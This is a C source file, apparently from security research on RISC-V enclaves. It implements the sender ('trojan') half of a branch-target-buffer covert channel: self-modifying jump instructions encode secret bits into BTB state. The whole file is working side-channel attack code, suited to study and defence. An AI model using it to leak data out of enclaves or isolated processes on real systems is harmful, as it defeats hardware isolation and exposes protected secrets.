#include "eapp_trojan.h"
#include "chipsupport.h"

int entries = 16;

btb_work_area area;
// save the opcode for easy rewritings
uint32_t zero_jumps[BTB_ENTRIES * JUMP_ALIGNMENT];
uint32_t one_jumps[BTB_ENTRIES * JUMP_ALIGNMENT];

void instructions_fence(void) {
    asm("fence.i" : : : "memory");
}

unsigned int encode_jump_offset(unsigned int offset) {
    unsigned int imm = offset & 0xFF000;
    imm |= (offset << 11) & 0x80000000;
    imm |= (offset << 20) & 0x7FE00000;
    imm |= (offset << 9) & 0x00100000;
    return imm;
}

// ret_one and ret_zero content is not important, but they are two distinct jump destinations.
__attribute__ ((noinline)) volatile WORD ret_zero() {
    return 0;
}

__attribute__ ((noinline)) volatile WORD ret_one() {
    return 1;
}

// the training gadget is an array of "j [ret_zero]" (size = BTB_ENTRIES), terminating with a ret
volatile void initalise_benchmark() {
   
    //write ret at the end
    area.entries[BTB_ENTRIES * JUMP_ALIGNMENT] = RET_OPCODE;
    
    WORD ret_zero_add = ((WORD) ret_zero);
    WORD ret_one_add = ((WORD) ret_one);

    for(WORD i = 0; i < BTB_ENTRIES; i++) {
        volatile INST* jadd = &(area.entries[i * JUMP_ALIGNMENT]);
        zero_jumps[i * JUMP_ALIGNMENT] = J_OPCODE | encode_jump_offset(ret_zero_add - (WORD)jadd);
        one_jumps[i * JUMP_ALIGNMENT]  = J_OPCODE | encode_jump_offset(ret_one_add - (WORD)jadd);

        // *jadd = zero_jumps[i]; // not necessary here
    }

    //1 - rewrite "j ret_zero" everywhere
    for(WORD i = 0; i < BTB_ENTRIES; i++) {
        INST* callsite = (INST*) &(area.entries[i * JUMP_ALIGNMENT]);
        *callsite = zero_jumps[i * JUMP_ALIGNMENT];
        for (int j = 1; j < JUMP_ALIGNMENT; j++) {
            area.entries[i*JUMP_ALIGNMENT+j] = NOP_OPCODE;
        }
    }
}

void touch_one_btb(WORD i) {
    //1 - rewrite "j ret_one"
    volatile INST* touch_add = &(area.entries[i * JUMP_ALIGNMENT]);
    *touch_add = one_jumps[i * JUMP_ALIGNMENT];
    instructions_fence();

    //2- execute jump
    // sig_jump* j = (sig_jump*) touch_add; // don't need
    asm volatile (".align 7");
    // Pad out with a 4 byte nop to keep alignment with spy.
    asm volatile(".word 0x13;"
                 "auipc ra, 0;"
                 "addi ra, ra, 10;"
                 "jalr x0, %0;"::"r"(touch_add)); // j();

    //3 - rewrite "j ret_zero"
    *touch_add = zero_jumps[i * JUMP_ALIGNMENT];
    instructions_fence();
}

void encode_secret(int i) {
  touch_one_btb(i);
}

int get_number_of_entries() {
    return entries;
}